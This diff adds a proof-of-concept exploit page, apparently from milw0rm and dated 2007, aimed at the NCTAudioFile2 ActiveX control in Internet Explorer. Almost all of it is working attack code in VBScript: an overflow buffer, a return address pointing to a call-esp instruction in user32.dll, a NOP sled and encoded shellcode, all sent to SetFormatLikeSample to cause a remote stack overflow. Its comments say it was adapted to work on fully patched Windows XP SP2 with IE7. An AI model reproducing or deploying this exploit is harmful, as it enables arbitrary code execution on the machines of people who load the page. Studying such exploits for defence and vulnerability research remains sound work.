@@ -1,0 +1,55 @@
+<html>
+<object classid='clsid:77829F14-D911-40FF-A2F0-D11DB8D6D0BC' id='NCTAudioFile2'></object>
+  <input language=VBScript onclick=tryMe() type=button value="Click here to start the test">
+   <script language = 'vbscript'>
+    Sub tryMe
+
+     '------------------------------------------------------------------
+     '[PoC2] IE NCTAudioFile2.AudioFile ActiveX Remote Stack Overfl0w
+     'original advisory: http://secunia.com/advisories/23475/
+     'author: shinnai
+     'mail: shinnai[at]autistici[dot]org
+     'site: http://shinnai.altervista.org
+     'based on: http://www.milw0rm.com/exploits/3728
+     '(see what InTeL said about Win XP Pro SP2 and IE7, enjoy brotha ;)
+     'modified for working on Win XP Pro SP2 with IE7 full patched
+     '------------------------------------------------------------------
+
+     buff = String (4116, "A")
+
+     get_EIP = unescape("%EB%AA%D7%77") '0x77D7AAEB call esp (from user32.dll)
+
+     nop = unescape("%90%90%90%90%90%90%90%90%90%90")
+
+     shellcode = unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%4f%49%49%49%49%49") & _
+                 unescape("%49%51%5a%56%54%58%36%33%30%56%58%34%41%30%42%36") & _
+                 unescape("%48%48%30%42%33%30%42%43%56%58%32%42%44%42%48%34") & _
+                 unescape("%41%32%41%44%30%41%44%54%42%44%51%42%30%41%44%41") & _
+                 unescape("%56%58%34%5a%38%42%44%4a%4f%4d%4e%4f%4a%4e%46%54") & _
+                 unescape("%42%30%42%50%42%50%4b%58%45%54%4e%53%4b%58%4e%37") & _
+                 unescape("%45%50%4a%47%41%30%4f%4e%4b%38%4f%44%4a%51%4b%48") & _
+                 unescape("%4f%55%42%42%41%30%4b%4e%49%44%4b%48%46%43%4b%38") & _
+                 unescape("%41%30%50%4e%41%53%42%4c%49%49%4e%4a%46%58%42%4c") & _
+                 unescape("%46%57%47%50%41%4c%4c%4c%4d%50%41%30%44%4c%4b%4e") & _
+                 unescape("%46%4f%4b%53%46%35%46%32%46%30%45%37%45%4e%4b%48") & _
+                 unescape("%4f%35%46%32%41%50%4b%4e%48%56%4b%38%4e%50%4b%54") & _
+                 unescape("%4b%48%4f%55%4e%31%41%30%4b%4e%4b%38%4e%41%4b%38") & _
+                 unescape("%41%30%4b%4e%49%58%4e%35%46%42%46%50%43%4c%41%43") & _
+                 unescape("%42%4c%46%36%4b%48%42%34%42%33%45%38%42%4c%4a%37") & _
+                 unescape("%4e%30%4b%48%42%34%4e%50%4b%48%42%57%4e%31%4d%4a") & _
+                 unescape("%4b%38%4a%46%4a%50%4b%4e%49%50%4b%48%42%38%42%4b") & _
+                 unescape("%42%30%42%50%42%30%4b%48%4a%36%4e%53%4f%35%41%33") & _
+                 unescape("%48%4f%42%46%48%35%49%58%4a%4f%43%48%42%4c%4b%57") & _
+                 unescape("%42%55%4a%46%42%4f%4c%48%46%50%4f%35%4a%46%4a%49") & _
+                 unescape("%50%4f%4c%38%50%30%47%55%4f%4f%47%4e%43%56%41%36") & _
+                 unescape("%4e%46%43%46%50%52%45%36%4a%37%45%36%42%30%5a")
+
+     egg = buff + get_EIP + nop + shellcode + nop
+
+     NCTAudioFile2.SetFormatLikeSample egg
+
+    End Sub
+   </script>
+</html>
+
+# milw0rm.com [2007-04-27]
